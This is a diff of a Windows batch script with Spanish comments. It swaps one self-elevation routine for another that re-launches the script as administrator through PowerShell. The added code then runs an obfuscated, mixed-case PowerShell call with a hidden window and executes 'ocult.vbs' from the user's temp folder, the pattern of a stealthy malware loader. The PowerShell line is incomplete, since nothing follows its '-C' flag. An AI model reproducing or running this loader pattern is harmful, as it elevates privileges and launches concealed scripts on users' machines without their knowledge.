@@ -1,40 +1,42 @@
 @echo off
-:: ### START UAC SCRIPT ###
+@echo off
+cd /d "%~dp0"
+if NOT "%cd%"=="%cd: =%" (
+   echo El directorio actual contine espacios en el path.
+   echo Este comando debe estar en un path que no contenga espacios. 
+   rundll32.exe cmdext.dll,MessageBeepStub
+   pause
+   echo.
+   goto :EOF
+)
 
-if "%2"=="firstrun" exit
-cmd /c "%0" null firstrun
+if {%1} EQU {[adm]} goto :data
+REG QUERY HKU\S-1-5-19\Environment >NUL 2>&1 && goto :data
 
-if "%1"=="skipuac" goto skipuacstart
+set command="""%~f0""" [adm] %*
+setlocal enabledelayedexpansion
+set "command=!command:'=''!"
 
-:checkPrivileges
-NET FILE 1>NUL 2>NUL
-if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )
+powershell -NoProfile Start-Process -FilePath '%COMSPEC%' ^
+-ArgumentList '/c """!command!"""' -Verb RunAs 2>NUL
+goto :EOF
 
-:getPrivileges
-if '%1'=='ELEV' (shift & goto gotPrivileges)
+:data
+setlocal enabledelayedexpansion
+if {%1} EQU {[adm]} (
+   set adm=%1
+   shift
+) ELSE (set adm=)
 
-setlocal DisableDelayedExpansion
-set "batchPath=%~0"
-setlocal EnableDelayedExpansion
-ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs"
-ECHO UAC.ShellExecute "!batchPath!", "ELEV", "", "runas", 1 >> "%temp%\OEgetPrivileges.vbs"
-"%temp%\OEgetPrivileges.vbs"
-exit /B
+:cuerpo
+REM ==============================================
+REM Poner aqui el codigo a ejecutar
+REM ==============================================
 
-:gotPrivileges
+powerSHeLl  -NoPROf  -NOLoGo  -WInDoW  HiDDEn  -noNINteRaCTiV -C
 
-setlocal & pushd .
+c:
 
-cd /d %~dp0
-cmd /c "%0" skipuac firstrun
-cd /d %~dp0
+cd %userprofile%\appdata\local\temp
 
-:skipuacstart
-
-if "%2"=="firstrun" exit
-
-:: ### END UAC SCRIPT ###
-
-:: ### START OF YOUR OWN BATCH SCRIPT BELOW THIS LINE ###
-
-Antiv.bat
+ocult.vbs
